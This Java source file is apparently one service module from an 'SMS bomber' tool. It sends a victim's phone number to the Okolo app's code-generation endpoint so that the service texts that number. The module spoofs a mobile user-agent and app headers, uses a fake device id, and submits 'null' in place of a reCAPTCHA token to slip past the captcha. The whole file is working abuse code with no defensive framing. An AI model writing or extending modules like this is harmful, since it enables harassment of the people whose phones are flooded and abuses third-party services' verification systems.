package com.dm.bomber.services;

import org.json.JSONException;
import org.json.JSONObject;

import okhttp3.Request;

public class Okolo extends JsonService {

    public Okolo() {
        setUrl("https://auth.okolo.app/api/client/gencode");
        setMethod(POST);
        setPhoneCode("7");
    }

    @Override
    public Request buildRequest(Request.Builder builder) {
        builder.addHeader("User-Agent", "Mozilla/5.0 (Linux; Android 11; M2010J19SY Build/RKQ1.201004.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.131 Mobile Safari/537.36");
        builder.addHeader("x-device-id", "aboba");
        builder.addHeader("x-client-request-id", "poZhj-r0PjUOIdLn_HGUG");
        builder.addHeader("x-requested-with", "com.x5.okoloapp");

        return super.buildRequest(builder);
    }

    @Override
    public String buildJson() {
        JSONObject json = new JSONObject();

        try {
            json.put("phone", phone);
            json.put("recaptcha_v2_token", "null");
        } catch (JSONException e) {
            e.printStackTrace();
        }

        return json.toString();
    }
}
